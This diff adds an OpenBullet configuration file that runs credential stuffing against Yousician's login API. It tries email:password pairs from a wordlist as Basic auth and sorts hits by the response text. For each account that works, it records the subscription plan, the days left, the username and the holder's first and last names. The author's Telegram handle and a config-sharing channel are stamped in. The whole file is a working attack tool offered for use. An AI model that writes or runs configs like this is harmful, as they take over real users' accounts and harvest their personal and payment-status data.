@@ -1,0 +1,129 @@
+[SETTINGS]
+{
+  "Name": "yousician.com",
+  "SuggestedBots": 90,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-03T18:58:15.2848679+08:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@wanted_boy",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Authorization FUNCTION Base64Encode "<USER>:<PASS>" -> VAR "Authorization" 
+
+#Login REQUEST POST "https://api.yousician.com/login" 
+  CONTENT "{\"source\":\"\",\"platform\":\"Windows\",\"variants\":\"\",\"gdpr_introduced\":true,\"app_type\":\"ProfilePages\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api.yousician.com" 
+  HEADER "Sec-Ch-Ua: \"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"101\"" 
+  HEADER "Authorization: Basic <Authorization>" 
+  HEADER "X-Application-Name: AccountSite" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://account.yousician.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://account.yousician.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Could not verify your access level for that URL" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" EqualTo "{}" 
+
+#Get REQUEST GET "https://api.yousician.com/payment/subscription" 
+  
+  HEADER "Host: api.yousician.com" 
+  HEADER "Sec-Ch-Ua: \"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"101\"" 
+  HEADER "X-Application-Name: AccountSite" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://account.yousician.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://account.yousician.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+IF "<SOURCE>" EqualTo "{}"
+SET STATUS CUSTOM "FREE"
+ENDIF
+
+#expireDate PARSE "<SOURCE>" JSON "renewable.period_end_date" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "expireDate" 
+
+#date FUNCTION Replace " \\d{1,2}:\\d{1,2}:\\d{1,2} [A-Z]{2}" "" UseRegex=TRUE "<expireDate>" -> VAR "date" 
+
+#unix FUNCTION DateToUnixTime "M/d/yyyy" "<date>" -> VAR "unix" 
+
+#current FUNCTION CurrentUnixTime -> VAR "current" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<unix>" LessThan "<current>" 
+
+#compute FUNCTION Compute "(<unix>-<current>)/86400" -> VAR "compute" 
+
+#daysLeft FUNCTION Round "<compute>" -> CAP "daysLeft" 
+
+#planName PARSE "<SOURCE>" JSON "core_plan_name" CreateEmpty=FALSE -> CAP "planName" 
+
+#Get REQUEST GET "https://api.yousician.com/account" 
+  
+  HEADER "Host: api.yousician.com" 
+  HEADER "Sec-Ch-Ua: \"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"101\"" 
+  HEADER "X-Application-Name: AccountSite" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://account.yousician.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://account.yousician.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#username PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "username" 
+
+#firstName PARSE "<SOURCE>" JSON "first_name" CreateEmpty=FALSE -> CAP "firstName" 
+
+#lastName PARSE "<SOURCE>" JSON "last_name" CreateEmpty=FALSE -> CAP "lastName" 
+
+SET CAP "Author Telegram" "@wanted_boy"
+SET CAP "Telegram Channel" "https://t.me/OpenBulletConfigs"
+
